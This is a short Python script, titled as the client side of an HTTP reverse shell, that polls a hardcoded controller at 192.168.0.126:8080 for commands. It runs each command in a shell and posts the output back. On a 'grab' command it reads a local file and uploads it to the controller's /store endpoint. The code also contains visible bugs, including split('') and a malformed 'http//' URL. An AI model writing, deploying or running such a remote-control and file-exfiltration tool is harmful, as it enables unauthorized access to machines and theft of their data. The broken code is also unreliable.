# HTTP Reverse Shell Script Client Side

from urllib import request, parse
import subprocess
import time
import os

SERVER_IP = "192.168.0.126"
SERVER_PORT = 8080

def send_post(data, url=f"http://{SERVER_IP}:{SERVER_PORT}"):
    try:
        data = {"rfile": data}
        data = parse.urlencode(data).encode()
        req = request.Request(url, data=data)
        request.urlopen(req) #Send Request
    except Exception as e:
        print(f"Error sending POST request: {e}")
        
def send_file(command):
    try:
        grab,path = command.strip().split('')
        
    except ValueError:
        send_post("[-] Invalid grab command (may be multiple spaces!)")
        return
    if not os.path.exists(path):
        send_post("[-] Not able to find the file")
        return
    store_url = f"http://{SERVER_IP}:{SERVER_PORT}/store"
    with open(path,'rb') as fp:
        send_post(fp.read(), url=store_url)
        
def run_command(command):
    try:
        CMD = subprocess.Popen(command, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)
        send_post(CMD.stdout.read())
        send_post(CMD.stderr.read())
    except Exception as e:
        print(f"Error running command : {e}")
        
while True:
    try:
        command = request.urlopen(f"http//{SERVER_IP}:{SERVER_PORT}").read().decode()
        if "terminate" in command:
            break
        if 'grab' in command:
            send_file(command)
            continue
        run_command(command)
        time.sleep(1)
    except Exception as e:
        print("Error erceiving command: {e}")